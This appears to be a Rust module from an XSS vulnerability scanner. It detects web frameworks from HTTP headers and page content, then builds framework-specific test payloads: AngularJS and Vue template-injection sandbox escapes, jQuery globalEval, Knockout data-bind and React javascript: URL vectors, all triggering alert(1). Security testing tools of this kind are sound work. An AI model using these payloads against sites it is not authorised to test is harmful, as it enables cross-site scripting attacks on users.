//! Technology/framework detection from HTTP response headers and body.
//!
//! Detects frontend frameworks and libraries to enable targeted XSS payloads:
//! - Angular → template injection payloads
//! - React → dangerouslySetInnerHTML vectors
//! - Vue.js → v-html/template injection
//! - jQuery → $.globalEval, $.html vectors
//! - Handlebars/Mustache → template injection
//! - Svelte/Ember → framework-specific vectors

use reqwest::header::HeaderMap;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TechType {
    Angular,
    React,
    Vue,
    Alpine,
    Preact,
    Lit,
    Solid,
    JQuery,
    Handlebars,
    Svelte,
    Ember,
    Backbone,
    Knockout,
    WordPress,
    ASPNet,
    PHP,
    Express,
    NextJs,
    Nuxt,
}

impl std::fmt::Display for TechType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TechType::Angular => write!(f, "Angular"),
            TechType::React => write!(f, "React"),
            TechType::Vue => write!(f, "Vue.js"),
            TechType::Alpine => write!(f, "Alpine.js"),
            TechType::Preact => write!(f, "Preact"),
            TechType::Lit => write!(f, "Lit"),
            TechType::Solid => write!(f, "SolidJS"),
            TechType::JQuery => write!(f, "jQuery"),
            TechType::Handlebars => write!(f, "Handlebars"),
            TechType::Svelte => write!(f, "Svelte"),
            TechType::Ember => write!(f, "Ember"),
            TechType::Backbone => write!(f, "Backbone"),
            TechType::Knockout => write!(f, "Knockout"),
            TechType::WordPress => write!(f, "WordPress"),
            TechType::ASPNet => write!(f, "ASP.NET"),
            TechType::PHP => write!(f, "PHP"),
            TechType::Express => write!(f, "Express"),
            TechType::NextJs => write!(f, "Next.js"),
            TechType::Nuxt => write!(f, "Nuxt"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct TechDetection {
    pub tech: TechType,
    pub evidence: String,
}

#[derive(Debug, Clone, Default)]
pub struct TechDetectionResult {
    pub detected: Vec<TechDetection>,
}

impl TechDetectionResult {
    pub(crate) fn is_empty(&self) -> bool {
        self.detected.is_empty()
    }

    pub(crate) fn has(&self, tech: &TechType) -> bool {
        self.detected.iter().any(|d| &d.tech == tech)
    }
}

/// `(header, lowercase value substring, tech, evidence)`.
const HEADER_RULES: &[(&str, &str, TechType, &str)] = &[
    (
        "x-powered-by",
        "asp.net",
        TechType::ASPNet,
        "X-Powered-By: ASP.NET",
    ),
    ("x-powered-by", "php", TechType::PHP, "X-Powered-By: PHP"),
    (
        "x-powered-by",
        "express",
        TechType::Express,
        "X-Powered-By: Express",
    ),
    (
        "x-powered-by",
        "next.js",
        TechType::NextJs,
        "X-Powered-By: Next.js",
    ),
    (
        "x-generator",
        "wordpress",
        TechType::WordPress,
        "X-Generator: WordPress",
    ),
    (
        "link",
        "wp-json",
        TechType::WordPress,
        "Link: wp-json (WordPress REST API)",
    ),
];

/// `(lowercase body substring, tech, evidence)`.
const BODY_RULES: &[(&str, TechType, &str)] = &[
    // Angular
    ("ng-app", TechType::Angular, "ng-app attribute"),
    (
        "ng-controller",
        TechType::Angular,
        "ng-controller attribute",
    ),
    ("ng-model", TechType::Angular, "ng-model attribute"),
    ("angular.min.js", TechType::Angular, "angular.min.js script"),
    ("angular.js", TechType::Angular, "angular.js script"),
    ("ng-version", TechType::Angular, "ng-version attribute"),
    // React
    (
        "data-reactroot",
        TechType::React,
        "data-reactroot attribute",
    ),
    ("data-reactid", TechType::React, "data-reactid attribute"),
    (
        "__next_data__",
        TechType::React,
        "__NEXT_DATA__ (Next.js/React)",
    ),
    (
        "react.production.min.js",
        TechType::React,
        "react.production.min.js",
    ),
    ("react-dom", TechType::React, "react-dom script reference"),
    // Vue.js
    ("v-app", TechType::Vue, "v-app attribute"),
    ("data-v-", TechType::Vue, "data-v- scoped style attribute"),
    ("vue.min.js", TechType::Vue, "vue.min.js script"),
    ("vue.js", TechType::Vue, "vue.js script"),
    ("vue.global", TechType::Vue, "vue.global script"),
    ("x-data", TechType::Alpine, "x-data attribute (Alpine.js)"),
    ("preact.min.js", TechType::Preact, "preact.min.js script"),
    ("lit-element", TechType::Lit, "lit-element reference"),
    ("_$hy", TechType::Solid, "_$HY hydration marker (SolidJS)"),
    // jQuery
    ("jquery.min.js", TechType::JQuery, "jquery.min.js script"),
    ("jquery.js", TechType::JQuery, "jquery.js script"),
    ("jquery/", TechType::JQuery, "jQuery CDN path"),
    // Handlebars
    (
        "handlebars.min.js",
        TechType::Handlebars,
        "handlebars.min.js",
    ),
    ("handlebars.js", TechType::Handlebars, "handlebars.js"),
    // Svelte. A bare "svelte" substring fires on unrelated prose
    // (e.g. "sveltekit", a word in a comment), so anchor each rule to a
    // framework-asset / runtime marker the way the sibling rules do.
    ("svelte.js", TechType::Svelte, "svelte.js script"),
    ("svelte.min.js", TechType::Svelte, "svelte.min.js script"),
    ("__svelte", TechType::Svelte, "__svelte runtime marker"),
    ("data-svelte", TechType::Svelte, "data-svelte attribute"),
    ("svelte-hmr", TechType::Svelte, "svelte-hmr dev runtime"),
    // Ember
    ("ember.min.js", TechType::Ember, "ember.min.js"),
    ("ember.js", TechType::Ember, "ember.js"),
    ("data-ember", TechType::Ember, "data-ember attribute"),
    // Backbone
    ("backbone.min.js", TechType::Backbone, "backbone.min.js"),
    ("backbone.js", TechType::Backbone, "backbone.js"),
    // Knockout
    ("knockout.min.js", TechType::Knockout, "knockout.min.js"),
    (
        "ko.observable",
        TechType::Knockout,
        "ko.observable (Knockout)",
    ),
    (
        "data-bind=",
        TechType::Knockout,
        "data-bind attribute (Knockout)",
    ),
    // WordPress
    ("wp-content/", TechType::WordPress, "wp-content/ path"),
    ("wp-includes/", TechType::WordPress, "wp-includes/ path"),
    // Nuxt
    ("__nuxt", TechType::Nuxt, "__NUXT reference"),
    ("nuxt.js", TechType::Nuxt, "nuxt.js script"),
    // Next.js (body)
    ("_next/static", TechType::NextJs, "_next/static path"),
];

/// Detect technologies from response headers and body.
pub(crate) fn detect_technologies(headers: &HeaderMap, body: Option<&str>) -> TechDetectionResult {
    let mut result = TechDetectionResult::default();

    // Header-based detection
    for (header, substr, tech, evidence) in HEADER_RULES {
        let matched = headers
            .get(*header)
            .and_then(|v| v.to_str().ok())
            .is_some_and(|v| v.to_ascii_lowercase().contains(substr));
        if matched {
            merge_detection(
                &mut result,
                TechDetection {
                    tech: tech.clone(),
                    evidence: evidence.to_string(),
                },
            );
        }
    }

    // Body-based detection
    if let Some(body_text) = body {
        let body_lower = body_text.to_ascii_lowercase();

        for (pattern, tech, evidence) in BODY_RULES {
            if body_lower.contains(pattern) {
                merge_detection(
                    &mut result,
                    TechDetection {
                        tech: tech.clone(),
                        evidence: evidence.to_string(),
                    },
                );
            }
        }

        // Fallback heuristic for client-side template injection (CSTI):
        // when no specific template framework (Angular, Vue, Handlebars,
        // Ember) has been identified yet, a literal `{{identifier}}`
        // interpolation surviving into the response body is a strong
        // signal that *some* client-side template engine is active —
        // typically a minified Angular/Vue bundle whose ng-app /
        // angular.js / vue.js banner has been tree-shaken away. Tagging
        // the target as Angular here lets the existing
        // `get_tech_specific_payloads` path fire AngularJS-flavored
        // template-escape payloads (which double as Vue 2 sandbox
        // escapes), recovering CSTI true positives we otherwise miss.
        let no_template_framework_detected = !result.has(&TechType::Angular)
            && !result.has(&TechType::Vue)
            && !result.has(&TechType::Handlebars)
            && !result.has(&TechType::Ember);
        if no_template_framework_detected && has_interpolation_brackets(body_text) {
            merge_detection(
                &mut result,
                TechDetection {
                    tech: TechType::Angular,
                    evidence: "interpolation `{{…}}` literal in body".to_string(),
                },
            );
        }
    }

    result
}

/// True when the response body contains at least one `{{identifier}}`
/// interpolation. Conservative: requires an identifier-shaped token
/// (`a-zA-Z_$` start, optionally followed by `\w` / `.` / `[…]` chain)
/// between the braces so we don't trip on prose like `{{ }}` or
/// `{{ 1 + 2 }}`. An identifier-shaped placeholder such as `{{ TODO }}`
/// does match, deliberately: that is the shape a real interpolation
/// takes, so it is cheaper to send the template payloads than to miss a
/// sink on a minified SPA.
fn has_interpolation_brackets(body: &str) -> bool {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let re = RE.get_or_init(|| {
        regex::Regex::new(r"\{\{\s*[a-zA-Z_$][\w.\[\]]*\s*\}\}")
            .expect("interpolation regex is well-formed")
    });
    re.is_match(body)
}

/// Merge detection, deduplicate by tech type.
fn merge_detection(result: &mut TechDetectionResult, detection: TechDetection) {
    if !result.has(&detection.tech) {
        result.detected.push(detection);
    }
}

/// Generate framework-specific XSS payloads based on detected technologies.
pub(crate) fn get_tech_specific_payloads(techs: &TechDetectionResult) -> Vec<String> {
    let class_marker = crate::scanning::markers::class_marker();
    let mut payloads = Vec::new();

    for detection in &techs.detected {
        match &detection.tech {
            TechType::Angular => {
                // Angular template injection (AngularJS 1.x)
                payloads.push(format!(
                    "{{{{constructor.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "{{{{$on.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                // Angular expression sandbox escape (various versions)
                payloads.push(format!(
                    "{{{{a]constructor.prototype.charAt=[].join;$eval('x]alert(1)//');}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::Vue => {
                // Vue.js template injection (v2/v3)
                payloads.push(format!(
                    "{{{{_c.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "{{{{this.constructor.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                // v-html injection marker
                payloads.push(format!(
                    "<div v-html=\"'<img src=x onerror=alert(1)>'\" class={}></div>",
                    class_marker
                ));
            }
            TechType::JQuery => {
                // jQuery-specific vectors
                payloads.push(format!(
                    "<img src=x onerror=$.globalEval('alert(1)') class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "<img src=x onerror=jQuery.globalEval('alert(1)') class={}>",
                    class_marker
                ));
            }
            TechType::Handlebars => {
                // Handlebars template injection
                payloads.push(format!(
                    "{{{{#with \"alert(1)\"}}}}{{{{this}}}}{{{{/with}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::Knockout => {
                // Knockout.js data-bind injection
                payloads.push(format!(
                    "<div data-bind=\"html:'<img src=x onerror=alert(1)>'\" class={}></div>",
                    class_marker
                ));
                payloads.push(format!(
                    "<div data-bind=\"attr:{{style:'x:expression(alert(1))'}}\" class={}></div>",
                    class_marker
                ));
            }
            TechType::Ember => {
                // Ember template injection
                payloads.push(format!(
                    "{{{{this.constructor.constructor(\"alert(1)\")()}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::WordPress => {
                // WordPress-specific: common plugin/theme XSS patterns
                payloads.push(format!(
                    "<img src=x onerror=alert(1) class={}>",
                    class_marker
                ));
            }
            TechType::React => {
                // React escapes text content by default. The XSS surface
                // is concentrated in two patterns:
                //   1. `<a href={userInput}>` — React still renders
                //      `javascript:` URLs (a runtime warning since 16.9
                //      but no actual sanitization). Hit href / iframe
                //      src / form action contexts via the protocol
                //      payload.
                //   2. `dangerouslySetInnerHTML={{__html: userInput}}` —
                //      maps to `innerHTML`, so `<svg onload>` /
                //      `<img onerror>` payloads execute. Server-side
                //      rendering puts the resulting HTML straight into
                //      the response, so a generic HTML payload also
                //      works; the `class={}` marker here lets us
                //      attribute the finding to the React-aware path.
                payloads.push(format!("javascript:alert(1)/*{}*/", class_marker));
                payloads.push(format!(
                    "<svg onload=alert(1) class={}></svg>",
                    class_marker
                ));
                payloads.push(format!(
                    "<img src=x onerror=alert(1) class={}>",
                    class_marker
                ));
            }
            // Server-side techs: no specific client-side payloads needed
            TechType::Alpine
            | TechType::Preact
            | TechType::Lit
            | TechType::Solid
            | TechType::Svelte
            | TechType::Backbone
            | TechType::ASPNet
            | TechType::PHP
            | TechType::Express
            | TechType::NextJs
            | TechType::Nuxt => {}
        }
    }

    payloads
}

#[cfg(test)]
mod tests;
